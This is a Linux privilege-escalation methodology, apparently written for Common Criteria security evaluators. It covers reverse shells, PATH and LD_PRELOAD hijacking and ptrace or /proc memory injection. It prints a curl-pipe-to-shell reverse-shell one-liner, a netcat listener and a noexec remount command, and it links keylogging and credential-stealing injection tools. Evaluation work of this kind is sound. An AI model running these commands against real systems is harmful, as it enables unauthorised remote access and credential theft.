---
title: Privilege escalation on Linux
---

- [Prerequisites](#prerequisites)
	- [Available Documentation](#available-documentation)
	- [Additional information gathering](#additional-information-gathering)
- [From arbitrary code or system command execution](#from-arbitrary-code-or-system-command-execution)
	- [General strategy](#general-strategy)
	- [Baby steps: get a "shell"](#baby-steps-get-a-shell)
		- [Shell? Bind shell? Reverse shell?](#shell-bind-shell-reverse-shell)
		- [Get a reverse shell](#get-a-reverse-shell)
			- [From command execution](#from-command-execution)
			- [From arbitrary code execution](#from-arbitrary-code-execution)
		- [Get a TTY](#get-a-tty)
- [From a shell](#from-a-shell)
	- [Low-hanging fruits](#low-hanging-fruits)
	- [Exploitation of available resources](#exploitation-of-available-resources)
		- [Identification](#identification)
			- [Files  (Non-upstream)](#files--non-upstream)
			- [Sockets, D-Bus...  (Non-upstream)](#sockets-d-bus--non-upstream)
			- [File system and drives](#file-system-and-drives)
			- [Users, groups](#users-groups)
		- [Exploitation](#exploitation)
	- [Exploitation of scripts and command calls](#exploitation-of-scripts-and-command-calls)
		- [Identification](#identification-1)
			- [Files  (Non-upstream)](#files--non-upstream-1)
		- [_Privileged_ scripts and _dangerous_ command calls](#privileged-scripts-and-dangerous-command-calls)
			- [Exploit the shell scripts themselves](#exploit-the-shell-scripts-themselves)
			- [Exploit calls to shell or commands](#exploit-calls-to-shell-or-commands)
			- [Pratical examples](#pratical-examples)
		- [_Safe_ command calls](#safe-command-calls)
	- [Exploitation of dynamic dependencies](#exploitation-of-dynamic-dependencies)
		- [Identification](#identification-2)
			- [Required privileges (Non-upstream)](#required-privileges-non-upstream)
			- [Services, processes...  (Non-upstream)](#services-processes--non-upstream)
		- [Exploitation](#exploitation-1)
		- [Practical examples](#practical-examples)
	- [Process injection](#process-injection)
		- [Identification](#identification-3)
			- [Required privileges (Non-upstream)](#required-privileges-non-upstream-1)
			- [Services, processes...  (Non-upstream)](#services-processes--non-upstream-1)
		- [Injection with ````ptrace```` or ````/proc/PID/mem````](#injection-with-ptrace-or-procpidmem)
			- [Exploitation](#exploitation-2)
				- [Peeking into memory](#peeking-into-memory)
				- [Tampering with a specific privileged process](#tampering-with-a-specific-privileged-process)
				- [Practical examples](#practical-examples-1)
				- [Generic execution of arbitrary code](#generic-execution-of-arbitrary-code)
	- [Other](#other)
	- [\[optional\] VM/Sandbox escape](#optional-vmsandbox-escape)




# Prerequisites

This method addresses the following starting points: 
 - The attacker has a code execution with user privileges
 - The attacker can execute a system command with user privileges
 - The attacker has a user full (reverse) shell

Whatever the starting point, this is not a CTF! The evaluator has more information (and access) than the attacker. The evaluator will typically have documentation, a root access on the TOE, etc. Therefore, they must make the most out of it and collect *any useful information* before starting.


## Available Documentation

In a CC evaluation, for each topic, the evaluator will first try to determine whether the ADV documentation is sufficiently clear. In a second step, the evaluator will check that the TOE conforms to this description. This second check should preferably be performed during the ADV review is the TOE is already available, but can be performed later.
In a whitebox evaluation, the evaluator will only perform the second check. 

NB: we will focus the AVA analysis on parts that have been patched/developed by the developer. 
Other programs can be skipped in the context of an AVA_VAN.3: we do not expect to be able to find vulnerabilities is known linux components in the constraint time of an evaluation.

| Topic | Expected content of ADV |
| :---- | :----   |
| TOE components |List kernel and distribution versions. Give a full list of installed programs and their versions. Classify in either<br> - Upstream: pure upstream components from the base OS repos<br> - Non-upstream: components added from other repos, or patched/developed by the TOE developer. |
| _Non-upstream_ : sources |List the developer of the component (proprietary, open source) and sources (install before delivery, address of the remote repository...)<br>Explain which protections measures are taken for the update (https access to mirrors, GPG verification)|
| _Non-upstream_ : files |List the files constituting the component: executables, libraries, config files... (folders, if too many files)|
| _Non-upstream_ : required privileges |Describe what privileges it requires for its execution, and why:<br> - execution as root or SUID rights<br> - sudo privileges<br> - capabilities<br>Comment any systemd unit used for the component|
| _Non-upstream_ : services, processes... |List the services, processes, scheduled/cron jobs that result from the execution of the component.|
| _Non-upstream_ : Sockets, D-Bus... | LIst the sockets / d-bus used by the component |
| File system and drives | Describe the filesystem of the TOE, and the associated permissions (incl. nosuid, nodev, noexec)<br>List all drives, their intended use and how credentials are used, if any |
| Users, groups | List the users and groups, with their respective privileges (esp. access to sudo/su)<br>What is the password Policy for users, and how (by which means) it is enforced?<br>which parts have access to PAM? |
| Hardening| Which hardening measures are used? (Yama ptrace scope, AppArmor, grsec, PaX, Execshield, SELinux, ASLR...)|

As a rule of thumb, the evaluator should be able to answer the following questions: 
 - Identify where network data is stored on the TOE: e.g. which process holds network data in memory? which files/sockets hold traffic data?
 - Identify which services and associated resources control
	 -  how the network data flow is handled in practice (e.g. iptables, FW config files...).
	 -  how identification, authentication, authorization and access control of users is handled in practice


**Example**: if the TOE uses OpenSSL to create a TLS trusted channel the target of the attacker would be as follows:
 - cleartext traffic is likely to be accessible only in the memory of the process that uses the SSL_read or SSL_write, while only encrypted traffic appears in the socket used by OpenSSL. 
 - the config file to target would mainly be openssl.cnf, but also the potential config files of the applications that make use of openSSL.

## Additional information gathering 
Logged in as root, run 
 - the [Low hanging fruits script](_0_System_AVA_testing\_resources\Low_hanging_fruits.sh): ````sudo ./Low_hanging_fruits.sh > Low_hanging_fruits.md````
 - the [Identification script](_0_System_AVA_testing\_resources\Identification.sh): ````sudo ./Identification.sh > Identification.md````


# From arbitrary code or system command execution 
## General strategy
As a starting point, the attacker is able to execute either *arbitrary code* or a *system command*, but only with restricted privileges. This execution may be blind (i.e. without feedback for the attacker), especially in remote attack scenarios.
    

Where to go from there?
 - **Straight to the top**: get a kernel exploit! or...
 - **Baby steps**: try to get some feedback from the execution, i.e. escalate privileges to gain an interactive shell

How to priorize? Search first the kernel version in *Low_hanging_fruits.md*, and run Metasploit to check whether a kernel exploit exists for this version. This result leads to two opposite strategies:
 - Either an exploit with a PoC already exists - in that case go **Straight to the top**!
 - Or there is no known exploit or PoC - in that case the kernel exploit is likely to be crazy hard to pull out, so go for **Baby steps**...

## Baby steps: get a "shell" 

### Shell? Bind shell? Reverse shell?
The attacker may execute a command through a compromise session on a given port, but running a shell be not be as trivial. 
(NB: restricted shells and "almost shells" such as the Busybox `ash` are considered as applications, and therefore addressed in the [Applicative privesc](_0_Linux_pentest\3_Annex_Applicative_privesc.md) method)

This method does not really distinguish between local and remote attackers ("local" meaning here "in a user session"), but considers the local scenario as a bit unlikely: there aren't many scenarios where the attacker could trigger code execution via an application, *without having access to the user session in the first place*. Rather than speculative cases where user actions on the GUI of an ATM could trigger a controllable buffer overflow, we will consider instead a general scenario where the attacker uses an application through some king of protocol, that may be physically local (e.g. TLV communications from a smartcard to a POS) or remote (e.g. HTTP from internet to a network device). There a consequence on the type of shell you want to create.

On a local network, the attacker may typically try to open a *bind shell*, i.e. run a shell on the TOE, connect it to an open port, then connect to this port from a machine controlled by the attacker. 

However, this does not scale well on a remote setting: if the TOE is behind a firewall, it may drop the connection to this port. If there is NAT, the IP of the TOE will not be easily reachable in practice, etc. This is why on a remote setting, the attacker may instead want to run a *reverse shell*, i.e. run a command that will actively connect to the attacker machine, typically through a popular port that will not be filtered by the firewall.

As a general rule it is just as complicated to get a bind shell than a reverse shell so our method will only focus on getting a reverse shell, which works in all cases. 

The other aspect to this question is that "getting a shell" means being able to type commands on the TOE and getting outputs back, *as you would on a terminal*. In practice, it means 
 - *not only* executing a shell, 
 - *but also* executing a TTY that gives you proper I/O to the shell you execute


### Get a reverse shell
#### From command execution
As we are not redteaming here, we'll use a simple and non stealthy method, using https://reverse-shell.sh/ (reverse shell as a service). The manual is displayed on the homepage and is pretty straightforward:
````
# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://reverse-shell.sh/yourip:1337 | sh
#
# 3. Don't be a dick
````
Notes:
 - This is, provided you have curl
 - you can also consider replacing sh by any shell is actually on the TOE

[TODO]: this has been included as a quick fix: add other, better reverse shell methods!

#### From arbitrary code execution
[TODO]
### Get a TTY
[TODO]


# From a shell
Let us now assume you have (or have already obtained) obtained a reverse shell and a TTY. Many possible exploitation paths are possible, but we will structure them as follows:
 - Low-hanging fruits (obvious config errors)
 - exploitation of available resources
 - exploitation of scripts and command calls
 - exploitation of dynamic dependencies
 - process injection
 - (other)

## Low-hanging fruits
Run the [Low hanging fruits script](_0_System_AVA_testing\_resources\Low_hanging_fruits.sh): ````sudo ./Low_hanging_fruits.sh > results.md````

Then follow the indications in the resulting Markdown file to check if there are hints of vulnerabilities. 

## Exploitation of available resources
### Identification
#### Files  (Non-upstream)
Check files permissions (not writable by an attacker), e.g. .service, .timer or .socket units - can you overwrite the files constituting a TOE component?
#### Sockets, D-Bus...  (Non-upstream)
 - can you communicate with sockets / d-bus used by the TOE?
#### File system and drives 
Check unwanted privileges:
 - do you have unexpected permissions on the filesystem or access to credentials?
#### Users, groups 
Check unwanted privileges
 - Can you natively escalate privileges thanks to a group you belong to?
 - What is the password policy?

### Exploitation 
[TODO] To be detailed to clarify the actual attack commands for
 - files
 - sockets, dbus
 - FS and drives
 - users/groups

## Exploitation of scripts and command calls
### Identification
#### Files  (Non-upstream)
In binaries: 
 - In a whitebox context, perform a code review to search keywords ````system````, ````popen````, ````execvp````, ````execlp````.
 - In a blackbox context, search the symbols directly in the binary: ````nm -D <path to binary> | grep <dangerous call: system, popen, execvp, execlp...> ````. 
 NB:  nm works in very simple cases (non stripped binary, etc). Extend this part for more complex cases.
Additionally:
 - Check for the presence of shells scripts in the TOE directories: ````find . -type f -perm /111 -exec file '{}' ';' | awk -F: '/script/ { print $1 }'```` 
 NB: the script cannot be run on / due to the likely high number of hits you would get.
 [TODO] to be completed with other scripts types (perl, etc.)
 - Check cron jobs:
	 - Is the PATH being modified by some cron and you can write in it?
	 - Any wildcard in a cron job?
	 - Some modifiable script is being executed or is inside modifiable folder?
	 - Have you detected that some script could be or are being executed very frequently? (every 1, 2 or 5 minutes)

### _Privileged_ scripts and _dangerous_ command calls
The following calls are dangerous because they result in a shell invocation and can be influenced (e.g. by the $PATH variable): ````system````, ````popen````, ````execvp````, ````execlp````.
Additionally, should they call shell scripts, these scripts may have elevated privileges and could be leveraged by an attacker.

#### Exploit the shell scripts themselves

If you identified scripts, check first [Exploiting shell scripts for privilege escalation](Pentesting_methods_and_tools\System_pentesting\Applicative_pentesting\Shell.md)

#### Exploit calls to shell or commands
 - Search a writable folder ````find / -type d -perm -o+w 2>/dev/null````   
 - Check if you can change $PATH, so that it points to the writable folder before any other.
 - In the writable folder create a link to a GTFObin to replace the command called by your privileged binary. 

Alternatives: instead of linking to an existing binary, you can 
 - copy the existing binary, 
 - create an arbitrary shell script and give it the binary name 
 - etc (don't forget to give it execution rights!)

#### Pratical examples 

Both following Rootme challenges rely on calls to ````system````
- [ch11 - Bash - System 1](../../../../Pentesting/Challenges%20and%20CTFs/Rootme/App-script/ch11%20-%20Bash%20-%20System%201.md)
- [ch12 - Bash - System 2](../../../../Pentesting/Challenges%20and%20CTFs/Rootme/App-script/ch12%20-%20Bash%20-%20System%202.md)


### _Safe_ command calls

If the binary calls a script by a method that does not perform path name substitution (i.e. ````execl````, ````execle````, ````execv````, or ````execve````, see [CERT](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177) for more details), *or if previous methods failed*, you still have possible attack vectors in the scripts themselves: see [Exploiting shell scripts for privilege escalation](Pentesting_methods_and_tools\System_pentesting\Applicative_pentesting\Shell.md).

## Exploitation of dynamic dependencies
In case the privileged binary is dynamically linked, try to influence its execution by changing the LD_LIBRARY_PATH or LD_PRELOAD variables.

NB: normally, this method does not work on *SUID* binaries, as the variable is ignored when executing them, but it is worth trying, esp. if the system uses a non standard linux.

### Identification
Warning: the exploitation is quite simple but it has a lot of prerequisites: it requires you either to compile on the TOE (compiler needed) or to cross-compile. Additionally, you need to be able to execute your binary on the TOE. Therefore, better to check early that all prerequisites are met:
 - Check if utilities/compilers are present ````which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl````
 - check if the binary has dynamic dependencies: ````ldd <path to binary>```` (or look for the ````NEEDED```` entries in the output of ````readelf --dynamic````)
 - Can you change LD_LIBRARY_PATH? Can you change LD_PRELOAD?
 - Are there folders where you can write *and* execute? especially if they are inside the PATH? 
 	 - ````find / -type d -perm -o+w 2>/dev/null````
	 - ````findmnt -l | grep noexec```` (if everything is noexec you can try to remount without it ````mount -o remount,rw,exec <path, e.g. /usr>````)
 - Do you have either a compiler on the TOE *or* a way to push a binary from outside the TOE? ````which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl````
   - NB: if you do not have a compiler on the TOE but a way to push file son it, the safest option is to seacrh a full toolchain that will allow you to compile statically on the TOE. 
     - Many toolchains are available on https://musl.cc/
     - don't forget to compile with gcc -static -staticlibgcc!


#### Required privileges (Non-upstream)
Check each component actual privileges and units
#### Services, processes...  (Non-upstream)
Any unknown software running? Any software running with more privileges than expected?
### Exploitation 
Generate an .so that will perform the action you want to perform with elevated rights.

As a general rule you would typically launch a shell but if the target has limited privileges, you may have to limit the action so that it actually works! 
E.g. if the target has only DAC-bypassing elevated capabilities you could use it to access restricted files, etc. 


### Practical examples
See (simple) examples in
 - [preload.c](Pentesting_methods_and_tools\System_pentesting\Applicative_pentesting\_resources\preload.c) for an attack on LD_PRELOAD 
 - [libcap.c](Pentesting_methods_and_tools\System_pentesting\Applicative_pentesting\_resources\libcap.c) for an attack on LD_LIBRARY_PATH

## Process injection
### Identification
Check that 
 - ````sys/kernel/yama/ptrace_scope```` is set to 1 or lower. If not, these techniques will not be applicable
	 - if 0, possibility to attach to any process
	 - if 1, only to a child process
	 - from 2, admin only
 - ````dd```` is available

#### Required privileges (Non-upstream)
Check each component actual privileges and units
#### Services, processes...  (Non-upstream)
Any unknown software running? Any software running with more privileges than expected?


 

### Injection with ````ptrace```` or ````/proc/PID/mem```` 

#### Exploitation
Several approaches are possible, in order of increasing complexity:
 - if ptrace_scope=0, 
 	 - peek in the memory of a privileged process to obtain cleartext keys, passwords... (e.g. in sshd)
	 - tamper with a privileged process to make it execute a command with elevated privileges (e.g. a shell)
 - if ptrace_scope=1: tamper with a userland process in order to obtain unprivileged but _arbitrary_ code execution.


##### Peeking into memory
Check that you can actually read the targeted ````/proc/<pid>/mem````. In most implementations, even with ptrace_scope=0 and a theoretically world-readable file, some additional protections will prevent you to access the file (e.g. capabilities).
This is a good first check before trying to tamper with a process using ptrace. 

##### Tampering with a specific privileged process
THis scenario makes sense either when trying to inject code in a privileged process (to execute it with elevated privileges) or in a same-level privilege process (to access assets that are not readable outside this process memory)

The first example is trivial (I'm a user and I want to execute code as root or a more privileged user). An example of the second case is when we have root _but are not able to read cleartext credentials that are exchanged in an SSH session because everything is done in memory_. 

A generic tool is available on [gaffe23 github](https://github.com/gaffe23/linux-inject). 

Its compatibility is limited (to their own admission it has only been successfully tested on Arch/Ubuntu, and does not work out-of-the-box on Debian. I _sort of_ adapted it to kali with mixed results).

It has still to be tried in a real life evaluation, but the score may well be within an AVA_VAN.3 if not too many adaptations are needed.

##### Practical examples
See [Adaptation of linux-inject to kali](_resources\custom-linux-inject-master)

The adaptation is not trivial: this version required a couple of days to adapt to kali and a recent glibc (change the code so that it searches `dlopen` instead of `__libc_dlopen_mode` and `libc` instead of `libc-`, fix a non null filled array for /proc/<pid>/maps filenames in utils.c) but does not work reliably. Typically:
 - it works successfully on the sample target, or on a bash running an infinite loop
 - it does NOT work on a ping (SEGFAULT)

Some additional adaptations may be required in the assembly or other parts (it might be a similar problem than e.g. https://0x00sec.org/t/linux-infecting-running-processes/1097 in section "those two bytes"). 

In its current state it can be worth looking at [keylogging scenarios](https://github.com/raj3shp/termspy)

Additional resources for a deeper look at this topic:
 - [Alternative implementation](https://github.com/raj3shp/ptrace_code_injection) (not tested)
 - [Process injection on sshd](https://blog.xpnsec.com/linux-process-injection-aka-injecting-into-sshd-for-fun/) (this is the example where root tries to read SSH credentials on the fly) (not tested)
 - an [alternative implementation in python](https://ancat.github.io/python/2019/01/01/python-ptrace.html) (not tested)

##### Generic execution of arbitrary code
If ptrace_scope is 1, or if we just want to execute unprivileged arbitrary code, another method is available: see [Unprivileged Process Injection Techniques in Linux](https://joev.dev/posts/unprivileged-process-injection-techniques-in-linux): _On Linux you use the ptrace syscall to remotely control the execution of a process and read/write into its memory._ [...] _the procfs mount implements mem device files for all processes in the namespace, available at /proc/[pid]/mem. These devices allow using standard filesystem syscalls to manipulate remote process memory. Behind the scenes, they are more or less a clone of parts of the existing ptrace syscalls; and in fact use the same ptrace_scope sysctl and resulting permissions. This allows us to use standard (util-linux and coreutils) commands (like dd or printf) to seek through and overwrite remote process memory via these device files; which lets us stage native code quietly and without needing a writable location on disk or relying on esoteric binaries._

A good starting point for in-memory injection can be found on [sektor7 blog](https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md)
We will favor this approach in pentest because:
 - it will score lower in attack potential (window of opportunity is larger because it does not leave artifacts and does not require to upload anything)
 - it will also work on TOEs with noexec filesystems

The method describes following several In-Memory-Only methods: Tmpfs, GDB, Python, Self-modifying dd. [Unprivileged Process Injection Techniques in Linux](https://joev.dev/posts/unprivileged-process-injection-techniques-in-linux) quotes other, newer methods, and a simpler "dumb" implementation. The evaluator should favor this latter implementation as a first attempt and move on to other methods if needed. This approach has the benefit of relying only on ````dd```` which is part of ````coreutils````.  

The main steps are:
 - From a shell, open a write fd to /proc/self/mem
 - Read /proc/self/syscall to find the return address of the read() syscall
 - In a child subshell, skip the fd to this address using dd skip=..., then write the shellcode payload
 - The parent process will then read() from the child process, triggering the payload

But they will not work by default and I did not try to adapt them yet, so the attack scoring is unknown.

Additional resources 
 - [here](https://cyber.aon.com/aon_cyber_labs/linux-based-inter-process-code-injection-without-ptrace2/) and 
 - [there](https://github.com/arget13/DDexec)

 

## Other
If these methods fails, 
[search for SW bugs in the program](Pentesting_methods_and_tools\System_pentesting\Applicative_pentesting\Software_vulnerability_research.md).

## [optional] VM/Sandbox escape
[TO be completed]
 - VM
 - docker: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security
 - etc.


